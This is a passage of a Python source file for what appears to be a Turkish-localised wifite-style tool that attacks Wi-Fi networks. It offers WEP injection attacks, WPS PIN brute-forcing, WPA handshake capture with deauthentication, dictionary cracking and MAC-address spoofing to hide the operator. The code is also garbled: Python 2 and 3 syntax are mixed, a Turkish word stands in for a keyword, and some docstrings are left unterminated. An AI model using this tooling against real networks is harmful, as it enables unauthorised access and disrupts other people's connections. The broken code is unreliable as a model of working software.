        str: Tahmin edilen BSSID veya boş string.
    """
    # Implement your logic here
    return ""

def get_essid_from_cap(bssid: str, capfile: str) -> str:
    """
    CAP dosyasından verilen BSSID'ye göre ESSID'yi tahmin eder.

    Parametreler:
        bssid (str): Hedef BSSID.
        capfile (str): CAP dosyasının yolu.

    Returns:
        str: Tahmin edilen ESSID veya boş string.
    """
    # Implement your logic here
    return ""

def banner(RUN_CONFIG):
    """
        Displays ASCII art of the highest caliber.
    R = "\033[31m"  # Kırmızı
W = "\033[37m"  # Beyaz

print(R + "  .;'                     `;,    ")
print(R + " .;'  ,;'             `;,  `;,   " + W + "Ozntev1 (r" + str(RUN_CONFIG.REVISION) + ")")
print(R + ".;'  ,;'  ,;'     `;,  `;,  `;,  ")
print(R + "::   ::   :   " + W + "( )" + R + "   :   ::   ::  " + W + "Wireless Watchdog")
print(R + "':.  ':.  ':. " + W + "/_\\" + R + " ,:'  ,:'  ,:'  ")
print(R + " ':.  ':.    " + W + "/___\\" + R + "    ,:'  ,:'   ")
print(R + "  ':.       " + W + "/_____\\" + R + "      ,:'     " + W + "https://github.com/ibrahimsql/oznte.py")
print(R + "           " + W + "/       \\" + R + "             ")
print W


def yardim():
          """ 
Yardım ekranını yazdırır  
"""

    baslik = W
    sw = R 
    var = gr
    aciklama = W
    de = C

    print baslik + '   KOMUTLAR' + W
    print sw + '\t-kontrol ' + var + '<dosya>\t' + aciklama + 'El sıkışmaları için cap dosyasını ' + var + '<dosya>' + aciklama + ' kontrol et.' + W
    print sw + '\t-kirilanlar  \t' + aciklama + 'Önceden kırılmış erişim noktalarını göster' + W
    print sw + '\t-yenkir      \t' + aciklama + 'Önceden kırılmış erişim noktalarının yeniden kırılmasına izin ver' + W
    print sw + '\t-gelismis    \t' + aciklama + 'Gelişmiş modda çalıştır (daha fazla ayrıntı ve kontrol sağlar)' + W
    print sw + '\t-log ' + var + '<dosya>\t' + aciklama + 'Tüm çıktıyı belirtilen dosyaya kaydet' + W
    print sw + '\t-tarama ' + var + '<sure>\t' + aciklama + 'Tarama süresini (dakika) belirle' + W
    print sw + '\t-otobasla    \t' + aciklama + 'Tarama tamamlandıktan sonra otomatik olarak saldırı başlat' + W
    print ''

    print baslik + '   GENEL' + W
    print sw + '\t-hepsi       \t' + aciklama + 'Tüm hedeflere saldır.              ' + de + '[kapalı]' + W
    print sw + '\t-i ' + var + '<arayüz>  \t' + aciklama + 'Yakalama için kablosuz arayüz ' + de + '[otomatik]' + W
    print sw + '\t-mon-arayuz ' + var + '<monitor_arayüz>  \t' + aciklama + 'Yakalama için izleme modunda arayüz ' + de + '[otomatik]' + W
    print sw + '\t-mac         \t' + aciklama + 'MAC adresini anonim hale getir        ' + de + '[kapalı]' + W
    print sw + '\t-c ' + var + '<kanal>  \t' + aciklama + 'Hedefleri taramak için kanal      ' + de + '[otomatik]' + W
    print sw + '\t-e ' + var + '<essid>  \t' + aciklama + 'SSID (isim) ile belirli bir erişim noktasını hedef al  ' + de + '[sor]' + W
    print sw + '\t-b ' + var + '<bssid>  \t' + aciklama + 'BSSID (mac) ile belirli bir erişim noktasını hedef al  ' + de + '[otomatik]' + W
    print sw + '\t-gosterb     \t' + aciklama + 'Tarama sonrası hedef BSSID’leri göster                ' + de + '[kapalı]' + W
    print sw + '\t-sinyal ' + var + '<db>   \t' + aciklama + 'Sinyal gücü > ' + var + 'db olan hedeflere saldırı ' + de + '[0]' + W
    print sw + '\t-sessiz      \t' + aciklama + 'Tarama sırasında AP listesini yazdırma                 ' + de + '[kapalı]' + W
    print sw + '\t-oncelik ' + var + '<sira>\t' + aciklama + 'Belirli bir hedefe öncelik ver (sıra numarası ile)' + W
    print sw + '\t-cikis ' + var + '<dosya>\t' + aciklama + 'Sonuçları belirtilen dosyaya yazdır' + W
    print ''

    print baslik + '\n   WPA' + W
    print sw + '\t-wpa        \t' + aciklama + 'Sadece WPA ağlarını hedef al (wps -wep ile çalışır)   ' + de + '[kapalı]' + W
    print sw + '\t-wpas ' + var + '<sn>   \t' + aciklama + 'WPA saldırısının tamamlanmasını bekleme süresi (saniye) ' + de + '[500]' + W
    print sw + '\t-wpad ' + var + '<sn>  \t' + aciklama + 'Deauth paketleri gönderme arasındaki bekleme süresi (sn) ' + de + '[10]' + W
    print sw + '\t-sifirla    \t' + aciklama + 'El sıkışmasını tshark veya pyrit kullanarak sıfırla             ' + de + '[kapalı]' + W
    print sw + '\t-sifre ' + var + '<sozluk>\t' + aciklama + 'WPA el sıkışmalarını ' + var + '<sozluk>' + aciklama + ' dosyasını kullanarak kır    ' + de + '[kapalı]' + W
    print sw + '\t-sozluk ' + var + '<dosya>\t' + aciklama + 'WPA kırma sırasında kullanılacak sözlüğü belirt ' + de + '[phpbb.txt]' + W
    print sw + '\t-aircrack   \t' + aciklama + 'El sıkışmasını aircrack ile doğrula ' + de + '[açık]' + W
    print sw + '\t-pyrit      \t' + aciklama + 'El sıkışmasını pyrit ile doğrula    ' + de + '[kapalı]' + W
    print sw + '\t-tshark     \t' + aciklama + 'El sıkışmasını tshark ile doğrula   ' + de + '[açık]' + W
    print sw + '\t-cowpatty   \t' + aciklama + 'El sıkışmasını cowpatty ile doğrula ' + de + '[kapalı]' + W
    print sw + '\t-agresif    \t' + aciklama + 'Daha hızlı ve agresif WPA kırma denemesi yap' + W
    print sw + '\t-wpamode ' + var + '<mode>\t' + aciklama + 'WPA kırma modu seç (agresif, standart, yavaş)' + W

    print baslik + '\n   WEP' + W
    print sw + '\t-wep        \t' + aciklama + 'Sadece WEP ağlarını hedef al ' + de + '[kapalı]' + W
    print sw + '\t-paket ' + var + '<num>  \t' + aciklama + 'Enjekte edilecek saniye başına paket sayısını ayarla ' + de + '[600]' + W
    print sw + '\t-wepbekle ' + var + '<sn> \t' + aciklama + 'Her saldırı için bekleme süresi, 0 sonsuz anlamına gelir ' + de + '[600]' + W
    print sw + '\t-chopchop   \t' + aciklama + 'Chopchop saldırısını kullan      ' + de + '[açık]' + W
    print sw + '\t-arpreplay  \t' + aciklama + 'Arpreplay saldırısını kullan     ' + de + '[açık]' + W
    print sw + '\t-parcalama  \t' + aciklama + 'Parçalama saldırısını kullan ' + de + '[açık]' + W
    print sw + '\t-caffelatte \t' + aciklama + 'Caffe-latte saldırısını kullan   ' + de + '[açık]' + W
    print sw + '\t-p0841      \t' + aciklama + '-p0841 saldırısını kullan        ' + de + '[açık]' + W
    print sw + '\t-hirte      \t' + aciklama + 'Hirte (cfrag) saldırısını kullan ' + de + '[açık]' + W
    print sw + '\t-sahteyetkiyok \t' + aciklama + 'Sahte yetkilendirme başarısız olursa saldırıyı durdur    ' + de + '[kapalı]' + W
    print sw + '\t-wepca ' + GR + '<n>  \t' + aciklama + 'IV sayısı n'yi aştığında kırmaya başla ' + de + '[10000]' + W
    print sw + '\t-wepkaydet  \t' + aciklama + '.cap dosyalarının bir kopyasını bu dizine kaydet ' + de + '[kapalı]' + W
    print sw + '\t-hizlises   \t' + aciklama + 'WEP saldırısının hızını arttırarak deneme yap' + W

    print baslik + '\n   WPS' + W
    print sw + '\t-wps        \t' + aciklama + 'Sadece WPS etkin erişim noktalarını hedef al ' + de + '[kapalı]' + W
    print sw + '\t-zorla      \t' + aciklama + 'WPS pin brute-force kullanarak şifreyi zorla' + W
    print sw + '\t-wpsbekle ' + var + '<sn>\t' + aciklama + 'Her WPS saldırısı için bekleme süresi, 0 sonsuz anlamına gelir' + de + '[300]' + W
    print sw + '\t-wpspin ' + var + '<pin>\t' + aciklama + 'Belirli bir WPS PIN kodu ile kırma denemesi yap' + de + '[otomatik]' + W
    print sw + '\t-reaver     \t' + aciklama + 'Reaver ile WPS brute-force saldırısı yap ' + de + '[açık]' + W
    print sw + '\t-bully      \t' + aciklama + 'Bully ile WPS brute-force saldırısı yap ' + de + '[kapalı]' + W
    print sw + '\t-wpsozluk ' + var + '<dosya>\t' + aciklama + 'WPS brute-force için özel bir sözlük dosyası kullan ' + de + '[pin.txt]' + W
    print sw + '\t-hizliwps   \t' + aciklama + 'Daha hızlı WPS kırma denemesi yap' + W
    print sw + '\t-wpsagresif \t' + aciklama + 'Daha agresif WPS brute-force saldırısı yap' + W

    print baslik + '\n   ÖZEL PARAMETRELER' + W
    print sw + '\t-tespit ' + var + '<yontem>\t' + aciklama + 'Sahte erişim noktası tespit yöntemi seç' + de + '[otonom]' + W
    print sw + '\t-kurtar ' + var + '<klasor>\t' + aciklama + 'Kurtarılan anahtarları belirli bir klasöre kaydet' + W
    print sw + '\t-dosyaformat ' + var + '<format>\t' + aciklama + 'Sonuç dosya formatını seç (cap, hccapx, pcap)' + W
    print sw + '\t-islemci ' + var + '<turu>\t' + aciklama + 'Kırma işlemi için kullanılacak işlemci türünü seç (GPU, CPU)' + W
    print sw + '\t-islemcisayisi ' + var + '<sayi>\t' + aciklama + 'Kullanılacak işlemci sayısını belirle' + W
    print sw + '\t-yuksekkal ' + var + '<kbps>\t' + aciklama + 'Yüksek kaliteli sinyal işlemi için hız sınırı belirle (kbps)' + W
    print sw + '\t-bantgenisligi ' + var + '<mbps>\t' + aciklama + 'Kullanılacak bant genişliğini belirle (mbps)' + W
    print sw + '\t-uzman      \t' + aciklama + 'Uzman modda çalıştır (tüm ayrıntılar açık, kontrol kullanıcının elinde)' + W

###########################
# KABLOSUZ KART FONKSİYONLARI #
###########################

def kablosuz_kart_durumu(kart_adi):
    """
        Belirtilen kablosuz kartın durumunu kontrol eder.
        Kart aktif mi, pasif mi ya da mevcut mu değil mi kontrol eder.
        Argümanlar:
            kart_adi: Kontrol edilecek kablosuz kartın adı.
        Döndürülen Değer:
            Kartın durumu hakkında bilgi verir.
    """
    try:
        output = subprocess.check_output(['iwconfig', kart_adi])
        if "No such device" in output:
            return "Kart bulunamadı."
        elif "ESSID:off/any" in output:
            return "Kart pasif durumda."
        else:
            return "Kart aktif ve bir ağa bağlı."
    except subprocess.CalledProcessError:
        return "Hata: Kartın durumu kontrol edilemedi."

##########################
# TARAMA FONKSİYONLARI #
##########################

def kablosuz_aglari_tara(kart_adi):
    """
        Belirtilen kablosuz kartla mevcut kablosuz ağları tarar.
        Argümanlar:
            kart_adi: Taramayı gerçekleştirecek kablosuz kartın adı.
        Döndürülen Değer:
            Bulunan kablosuz ağların listesi.
    """
    try:
        output = subprocess.check_output(['iwlist', kart_adi, 'scan'])
        aglar = re.findall(r'ESSID:"(.+?)"', output.decode('utf-8'))
        if len(aglar) == 0:
            return "Herhangi bir ağ bulunamadı."
        return aglar
    except subprocess.CalledProcessError:
        return "Taramada hata oluştu. Kart aktif durumda mı kontrol edin."

def wps_hedefleri_kontrol_et(hedefler, cap_dosyasi, ayrintili=True):
    """
        Tshark kullanarak cap_dosyasında bulunan erişim noktalarını WPS uyumluluğu açısından kontrol eder.
        Eşleşen hedeflerin "wps" alanını True olarak ayarlar.
        Argümanlar:
            hedefler: Kontrol edilecek erişim noktalarının listesi.
            cap_dosyasi: Tshark ile analiz edilecek yakalama dosyasının yolu.
            ayrintili: Ayrıntılı çıktı isteyip istemediğiniz.
    """
    global RUN_CONFIG

    if not program_var_mi('tshark'):
        RUN_CONFIG.WPS_DEVREDISI = True  # Tshark'ı çalıştırmanın mümkün olmadığını 'taramaya' bildirir
        return

    if len(hedefler) == 0 veya not os.path.exists(cap_dosyasi): 
        return

    if ayrintili:
        print GR + ' [+]' + W + ' ' + G + 'WPS uyumluluğu' + W + ' kontrol ediliyor...',
        stdout.flush()

    cmd = [
        'tshark',
        '-r', cap_dosyasi,  # Cap dosyasının yolu
        '-n',  # Adresleri çözme
        # WPS yayın paketlerini filtreleme
        '-Y', 'wps.wifi_protected_setup_state && wlan.da == ff:ff:ff:ff:ff:ff',
        '-T', 'fields',  # Sadece belirli alanları çıkart
        '-e', 'wlan.ta',  # BSSID
        '-e', 'wps.ap_setup_locked',  # Kilitli durumu
        '-E', 'separator=,'  # CSV
    ]
    try:
        proc_tshark = Popen(cmd, stdout=PIPE, stderr=DN)
        proc_tshark.wait()
        tshark_stdout, _ = proc_tshark.communicate()
        bssid_regex = re.compile("([A-F0-9\:]{17})", re.IGNORECASE)
        bssid_listesi = [bssid.upper() for bssid in bssid_regex.findall(tshark_stdout)]
        
        for hedef in hedefler:
            hedef.wps = hedef.bssid.upper() in bssid_listesi

        if ayrintili:
            print 'WPS kontrolü tamamlandı.'
    except Exception as e:
        print "WPS kontrolünde hata: ", str(e)
    
    silinenler = 0
    if not RUN_CONFIG.WPS_DEVREDISI and RUN_CONFIG.WPA_DEVREDISI:
        i = 0
        while i < len(hedefler):
            if not hedefler[i].wps and hedefler[i].sifreleme.find('WPA') != -1:
                silinenler += 1
                hedefler.pop(i)
            else:
                i += 1
        if silinenler > 0 and ayrintili: 
            print GR + ' [+]' + O + ' %d WPS desteklemeyen hedef silindi%s' % (silinenler, W)


def yazdir_ve_calistir(cmd):
    """
        "cmd" komutunu yazdırır ve yürütür. Ayrıca yarım saniye bekler.
        rtl8187_fix tarafından (güzellik için) kullanılır.
        Argümanlar:
            cmd: Yürütülecek komut listesi.
    """
    try:
        print '\r                                                        \r',
        stdout.flush()
        print O + ' [!] ' + W + 'şu komut yürütülüyor: ' + O + ' '.join(cmd) + W,
        stdout.flush()
        call(cmd, stdout=DN, stderr=DN)
        time.sleep(0.5)
    except Exception as e:
        print "Komut yürütülürken hata: ", str(e)

####################
# YARDIMCI FONKSİYONLAR #
####################

def program_var_mi(program_adi):
    """
        Belirtilen programın sistemde yüklü olup olmadığını kontrol eder.
        Argümanlar:
            program_adi: Kontrol edilecek programın adı.
        Döndürülen Değer:
            Program yüklüyse True, değilse False.
    """
    try:
        devnull = open(os.devnull)
        subprocess.Popen([program_adi], stdout=devnull, stderr=devnull).communicate()
        return True
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            return False
    return False

def cap_dosyasi_analiz(cap_dosyasi):
    """
        Tshark ile cap dosyasını analiz eder ve detaylı bilgi sağlar.
        Argümanlar:
            cap_dosyasi: Analiz edilecek yakalama dosyasının yolu.
        Döndürülen Değer:
            Analiz sonucu bilgileri içeren bir string.
    """
    if not os.path.exists(cap_dosyasi):
        return "Hata: Cap dosyası bulunamadı."

    cmd = ['tshark', '-r', cap_dosyasi, '-V']
    try:
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        output, _ = proc.communicate()
        return output.decode('utf-8')
    except Exception as e:
        return "Cap dosyası analiz edilirken hata: " + str(e)

def sifreleme_tipi_belirle(bssid):
    """
        Belirtilen BSSID için şifreleme tipini belirler.
        Argümanlar:
            bssid: Kontrol edilecek kablosuz ağın BSSID'si.
        Döndürülen Değer:
            Şifreleme tipi hakkında bilgi verir.
    """
    if not bssid:
        return "Geçersiz BSSID"

    cmd = ['airmon-ng', 'check', bssid]
    try:
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        output, _ = proc.communicate()
        if "WPA2" in output:
            return "WPA2"
        elif "WPA" in output:
            return "WPA"
        elif "WEP" in output:
            return "WEP"
        else:
            return "Şifreleme tipi belirlenemedi."
    except Exception as e:
        return "Şifreleme tipi belirlenirken hata: " + str(e)


#############################
# DOSYA TEMİZLEME FONKSİYONLARI #
#############################

def remove_airodump_files(prefix):
    """
        Belirtilen dosya ön ekine sahip airodump çıktı dosyalarını temizler ('wpa', 'wep', vb.).
        Bu fonksiyon, wpa_get_handshake() ve attack_wep() fonksiyonları tarafından kullanılır.
        Argümanlar:
            prefix: Temizlenecek dosya ön eki. Örneğin: 'wpa', 'wep'.
    """
    global RUN_CONFIG

    def remove_file(filename):
        """
            Dosyayı silmeye çalışır. Dosya bulunamazsa hata fırlatmaz.
            Argümanlar:
                filename: Silinecek dosyanın adı.
        """
        try:
            os.remove(filename)
            print(f"Silindi: {filename}")
        except OSError as e:
            print(f"Dosya silinirken hata oluştu: {e}")

    # Temizlenmesi gereken dosya uzantıları
    file_extensions = ['-01.cap', '-01.csv', '-01.kismet.csv', '-01.kismet.netxml']
    for ext in file_extensions:
        remove_file(prefix + ext)

    # Geçici dizindeki .xor uzantılı dosyaları temizle
    try:
        for filename in os.listdir(RUN_CONFIG.temp):
            if filename.lower().endswith('.xor'):
                remove_file(os.path.join(RUN_CONFIG.temp, filename))
    except FileNotFoundError as e:
        print(f"Geçici dizin bulunamadı: {e}")

    # Mevcut dizindeki replay_ ve .xor uzantılı dosyaları temizle
    try:
        for filename in os.listdir('.'):
            if filename.startswith('replay_') and filename.endswith('.cap'):
                remove_file(filename)
            elif filename.endswith('.xor'):
                remove_file(filename)
    except FileNotFoundError as e:
        print(f"Mevcut dizin okunamadı: {e}")

    # Önceki saldırı oturumlarına ait .cap dosyalarını temizle
    """
    i = 2
    while os.path.exists(RUN_CONFIG.temp + 'wep-' + str(i) + '.cap'):
        try:
            os.remove(RUN_CONFIG.temp + 'wep-' + str(i) + '.cap')
            print(f"Silindi: {RUN_CONFIG.temp + 'wep-' + str(i) + '.cap'}")
        except OSError as e:
            print(f"Dosya silinirken hata oluştu: {e}")
        i += 1
    """

##############################
# PROGRAM VE MAC FONKSİYONLARI #
##############################

def program_exists(program):
    """
        'which' komutunu kullanarak bir programın sistemde yüklü olup olmadığını kontrol eder.
        Argümanlar:
            program: Kontrol edilecek programın adı.
        Döndürülen Değer:
            Program yüklüyse True, değilse False.
    """
    try:
        proc = Popen(['which', program], stdout=PIPE, stderr=PIPE)
        txt = proc.communicate()
        if txt[0].strip() == '' and txt[1].strip() == '':
            return False
        return txt[0].strip() != '' and txt[1].strip() == ''
    except FileNotFoundError as e:
        print(f"'which' komutu bulunamadı: {e}")
        return False

def sec_to_hms(sec):
    """
        Tam sayı olarak verilen 'sec' değerini saat:dakika:saniye formatına dönüştürür.
        Argümanlar:
            sec: Zamanı saniye cinsinden ifade eden tam sayı.
        Döndürülen Değer:
            Saat:dakika:saniye formatında zaman dizesi.
    """
    if sec <= -1:
        return '[endless]'
    h = sec // 3600
    sec %= 3600
    m = sec // 60
    sec %= 60
    return '[%d:%02d:%02d]' % (h, m, sec)

def send_interrupt(process):
    """
        Belirtilen sürecin PID'sine kesme sinyali gönderir.
        Argümanlar:
            process: Kesme sinyali gönderilecek sürecin nesnesi.
    """
    try:
        os.kill(process.pid, SIGINT)
        print(f"Kesme sinyali gönderildi: PID {process.pid}")
    except (OSError, TypeError, UnboundLocalError, AttributeError) as e:
        print(f"Sürecin kesilmesinde hata oluştu: {e}")

def get_mac_address(iface):
    """
        Verilen arayüz için MAC adresini döndürür.
        Argümanlar:
            iface: MAC adresi alınacak ağ arayüzü.
        Döndürülen Değer:
            MAC adresi dizesi.
    """
    try:
        proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)
        proc.wait()
        output = proc.communicate()[0].decode('utf-8')
        mac_regex = r'([a-fA-F0-9:]{17})'
        match = re.search(mac_regex, output)
        if match:
            return match.group()
        else:
            print(f"{iface} arayüzü için MAC adresi bulunamadı.")
            return 'MAC adresi bulunamadı'
    except Exception as e:
        print(f"MAC adresi alınırken hata oluştu: {e}")
        return 'MAC adresi alınamadı'

def generate_random_mac(old_mac):
    """
        Rastgele bir MAC adresi üretir.
        Eski MAC adresinin ilk 6 karakterini korur ve son 6 karakteri rastgele oluşturur.
        Argümanlar:
            old_mac: Eski MAC adresi.
        Döndürülen Değer:
            Yeni rastgele MAC adresi dizesi.
    """
    random.seed()
    new_mac = old_mac[:8].lower().replace('-', ':')
    new_mac += ':'.join(random.choices('0123456789abcdef', k=6)).upper()
    # Aynı MAC adresinin üretilmesini önlemek için özyineleme
    if new_mac == old_mac:
        return generate_random_mac(old_mac)
    return new_mac

def mac_anonymize(iface):
    """
        'iface' arayüzünün MAC adresini rastgele bir MAC adresi ile değiştirir.
        Sadece MAC adresinin son 6 karakterini rastgele hale getirir, böylece üretici değişmez.
        Eski MAC adresi ve arayüzü ORIGINAL_IFACE_MAC'de saklar.
        Argümanlar:
            iface: MAC adresi değiştirilecek ağ arayüzü.
global RUN_CONFIG

def mac_degisimi():
    """
    Verilen ağ arayüzü için MAC adresini değiştirir. Değiştirme işlemi sırasında herhangi bir hata oluşursa, hata mesajı verir.
    """
    if RUN_CONFIG.DO_NOT_CHANGE_MAC:
        print("MAC adresi değiştirilmeyecek. Bu ayar, mevcut MAC adresinin korunmasını sağlar.")
        return

    if not program_exists('ifconfig'):
        print("'ifconfig' komutu bulunamadı. Lütfen 'ifconfig' komutunun yüklü ve erişilebilir olduğundan emin olun.")
        return

    try:
        # Eski (mevcut) MAC adresini sakla
        proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)
        proc.wait()
        output = proc.communicate()[0].decode('utf-8')
        eski_mac = re.search(r'([a-fA-F0-9:]{17})', output)
        if eski_mac:
            eski_mac = eski_mac.group()
        else:
            print(f"{iface} arayüzü için mevcut MAC adresi bulunamadı. Lütfen arayüzün doğru olduğunu kontrol edin.")
            return

        RUN_CONFIG.ORIGINAL_IFACE_MAC = (iface, eski_mac)
        yeni_mac = generate_random_mac(eski_mac)

        # MAC adresini değiştir
        call(['ifconfig', iface, 'down'])
        print(f" [+] {iface} arayüzünün MAC adresi {eski_mac} adresinden {yeni_mac} adresine değiştiriliyor...", end=' ')
        stdout.flush()

        proc = Popen(['ifconfig', iface, 'hw', 'ether', yeni_mac], stdout=PIPE, stderr=DN)
        proc.wait()
        call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
        print('başarıyla değiştirildi.')

    except Exception as e:
        print(f"MAC adresi değiştirirken hata oluştu: {e}. Bu hata, ağ arayüzünüzle ilgili bir sorun veya sistem yapılandırmasıyla ilgili olabilir.")

def mac_degisimi_geri_al():
    """
    Daha önce değiştirilmiş MAC adresini geri alır ve orijinal MAC adresine döndürür. Bu işlem, ağ arayüzünü eski haline getirir.
    """
    iface = RUN_CONFIG.ORIGINAL_IFACE_MAC[0]
    eski_mac = RUN_CONFIG.ORIGINAL_IFACE_MAC[1]
    if iface == '' or eski_mac == '':
        print("Önceki MAC adresi bilgisi mevcut değil veya ağ arayüzü tanımlı değil.")
        return

    print(f" [+] {iface} arayüzünün MAC adresini {eski_mac} adresine geri değiştiriliyor...", end=' ')
    stdout.flush()

    call(['ifconfig', iface, 'down'], stdout=DN, stderr=DN)
    proc = Popen(['ifconfig', iface, 'hw', 'ether', eski_mac], stdout=PIPE, stderr=DN)
    proc.wait()
    call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
    print("Başarıyla geri alındı. MAC adresi eski haline döndürüldü.")

def essid_getir_cap(bssid, capfile):
    """
    CAP dosyasından belirli bir BSSID'ye göre ESSID'yi elde etmeye çalışır.
    Eğer ESSID bulunamazsa, boş string döner.
    """
    if not program_exists('tshark'):
        print("'tshark' komutu bulunamadı. Lütfen 'tshark' komutunun yüklü ve erişilebilir olduğundan emin olun.")
        return ''

    cmd = ['tshark',
           '-r', capfile,
           '-R', f'wlan.fc.type_subtype == 0x05 && wlan.sa == {bssid}',
           '-2',  # -R kullanımının eski olması ve -2 gerektirmesi
           '-n']
    proc = Popen(cmd, stdout=PIPE, stderr=DN)
    proc.wait()
    for line in proc.communicate()[0].split('\n'):
        if 'SSID=' in line:
            essid = line[line.find('SSID=') + 5:]
            print(f" [+] Tahmin edilen ESSID: {essid}")
            return essid
    print(" [!] ESSID tahmin edilemedi. Belirtilen CAP dosyasında ESSID bulunamadı.")
    return ''

def bssid_getir_cap(essid, capfile):
    """
    CAP dosyasından belirtilen ESSID'ye göre ilk bulunan BSSID'yi döndürür.
    Bu yöntem oldukça tahminidir ve kesin sonuçlar vermeyebilir.
    Eğer BSSID bulunamazsa, boş string döner.
    """
    global RUN_CONFIG

    if not program_exists('tshark'):
        print("'tshark' komutu bulunamadı. Lütfen 'tshark' komutunun yüklü ve erişilebilir olduğundan emin olun.")
        return ''

    # ESSID'ye dayalı olarak BSSID elde etmeye çalış
    if essid != '':
        cmd = ['tshark',
               '-r', capfile,
               '-R', f'wlan_mgt.ssid == "{essid}" && wlan.fc.type_subtype == 0x05',
               '-2',  # -R kullanımının eski olması ve -2 gerektirmesi
               '-n',  # MAC satıcı adlarını çözme
               '-T', 'fields',  # Belirli alanları sadece görüntüle
               '-e', 'wlan.sa']  # kaynak MAC adresi
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        proc.wait()
        bssid = proc.communicate()[0].split('\n')[0]
        if bssid != '': return bssid

    # EAPOL paketlerine dayalı olarak BSSID elde etmeye çalış
    cmd = ['tshark',
           '-r', capfile,
           '-R', 'eapol',
           '-2',  # -R kullanımının eski olması ve -2 gerektirmesi
           '-n']
    proc = Popen(cmd, stdout=PIPE, stderr=DN)
    proc.wait()
    for line in proc.communicate()[0].split('\n'):
        if line.endswith('Key (msg 1/4)') or line.endswith('Key (msg 3/4)'):
            line = line.strip().replace('\t', ' ').replace('  ', ' ')
            return line.split(' ')[2]
        elif line.endswith('Key (msg 2/4)') or line.endswith('Key (msg 4/4)'):
            line = line.strip().replace('\t', ' ').replace('  ', ' ')
            return line.split(' ')[4]
    print(" [!] BSSID tahmin edilemedi. Belirtilen CAP dosyasında BSSID bulunamadı.")
    return ''

def saldiri_iptal_promptu():
    """
    Kullanıcıya saldırıyı bitirmek, WPA el sıkışmalarını kırmaya geçmek veya kalan hedeflere saldırmaya devam etmek isteyip istemediğini sorar.
    Kullanıcı çıkmayı seçerse True, aksi takdirde False döner.
    """
    global RUN_CONFIG
    cikmali_miyiz = False
    # Hedefler varsa, sonraki adımı sorar
    if RUN_CONFIG.TARGETS_REMAINING > 0:
        secenekler = ''
        print(f"\n [+] {RUN_CONFIG.TARGETS_REMAINING} hedef kaldı. Kalan hedeflerin sayısı.")
        print(" [+] Ne yapmak istersiniz?")
        secenekler += 'c'
        print("     [c] Hedeflere saldırmaya devam et")

        if len(RUN_CONFIG.WPA_CAPS_TO_CRACK) > 0:
            secenekler += ', s'
            print("     [s] WPA cap dosyalarını kırmaya geç")
        secenekler += ', veya e'
        print("     [e] Tamamen çık")

        ri = ''
        while ri not in ['c', 's', 'e']:
            ri = input(f' [+] Lütfen bir seçim yapın ({secenekler}): ')

        if ri == 's':
            RUN_CONFIG.TARGETS_REMAINING = -1  # start() fonksiyonuna diğer hedefleri göz ardı etmesini ve WPA kırmaya geçmesini söyler
        elif ri == 'e':
            cikmali_miyiz = True
    return cikmali_miyiz

# Soyut temel sınıf saldırılar için.
# Saldırıların aşağıdaki yöntemleri uygulaması gerekir:
#       RunAttack - Saldırıyı başlatır
#       EndAttack - Saldırıyı düzgün şekilde sonlandırır
#
class Saldırı(object):
    __metaclass__ = abc.ABCMeta

    @abc.abstractmethod
    def RunAttack(self):
        """
        Saldırıyı başlatır. Bu yöntem, saldırının tüm başlangıç işlemlerini yapmalıdır.
        """
        raise NotImplementedError()

    @abc.abstractmethod
    def EndAttack(self):
        """
        Saldırıyı sonlandırır. Bu yöntem, saldırı sonrası temizlik işlemlerini yapmalıdır.
        """
        raise NotImplementedError()


#################
# WPA Capture & Deauthentication Procedures #
#################

class WPAAttack(Saldırı):
    def __init__(self, iface, target, clients, config):
        """
        WPAAttack sınıfının başlatıcı fonksiyonu.
        
        Args:
            iface (str): Kullanılacak ağ arayüzü.
            target (Target): Hedef ağ bilgilerini içeren nesne.
            clients (list): Hedefe bağlı olan istemci nesneleri.
            config (Config): Yapılandırma bilgilerini içeren nesne.
        """
        self.iface = iface
        self.clients = clients
        self.target = target
        self.RUN_CONFIG = config

    def RunAttack(self):
        """
        WPA saldırısını başlatır. Bu metod, WPA el sıkışmalarını yakalamak için gerekli işlemleri başlatır.
        """
        self.wpa_get_handshake()

    def EndAttack(self):
        """
        WPA saldırısını sonlandırır. Bu metod, saldırı tamamlandığında gerekli temizliği yapmalıdır.
        """
        # Bu metod henüz tanımlanmamış, ihtiyaç duyulursa sonlandırma işlemleri eklenebilir.
        pass

    def wpa_get_handshake(self):
        """
        Hedef üzerinde airodump ile el sıkışmaları yakalamak için bir yakalama işlemi başlatır.
        Yakalama sırasında hedefe hem genel hem de bağlı istemcilere yönelik de-authentication paketleri gönderir.
        El sıkışma yakalanana kadar bekler.
        
        Args:
            iface (str): El sıkışma yakalamak için kullanılacak ağ arayüzü.
            target (Target): El sıkışma yakalamak için hedef erişim noktası bilgileri.
            clients (list): Hedefin bağlı olduğu istemci nesneleri.
        
        Returns:
            bool: El sıkışma bulunduysa True, aksi takdirde False.
        """
        # WPA saldırı süresi sıfır veya negatifse, bu durumda saldırı süresini sonsuz yapar
        if self.RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0:
            self.RUN_CONFIG.WPA_ATTACK_TIMEOUT = -1

        # CAP dosyasının adını belirler: <SSID>_aa-bb-cc-dd-ee-ff.cap
        save_as = self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) \
                  + '_' + self.target.bssid.replace(':', '-') + '.cap'

        # Aynı SSID için el sıkışma dosyası varsa yeni dosya adı oluşturur
        save_index = 0
        while os.path.exists(save_as):
            save_index += 1
            save_as = self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) \
                      + '_' + self.target.bssid.replace(':', '-') \
                      + '_' + str(save_index) + '.cap'

        file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wpa')
        cap_file = file_prefix + '-01.cap'
        csv_file = file_prefix + '-01.csv'

        # Önceki airodump çıktı dosyalarını temizler
        remove_airodump_files(file_prefix)

        # Büyük bir Try-Except bloğu, genellikle Ctrl+C (Klavye kesintisi) hatalarını yakalamak için
        try:
            # Airodump-ng sürecini başlatır
            cmd = ['airodump-ng',
                   '-w', file_prefix,
                   '-c', self.target.channel,
                   '--write-interval', '1',
                   '--bssid', self.target.bssid,
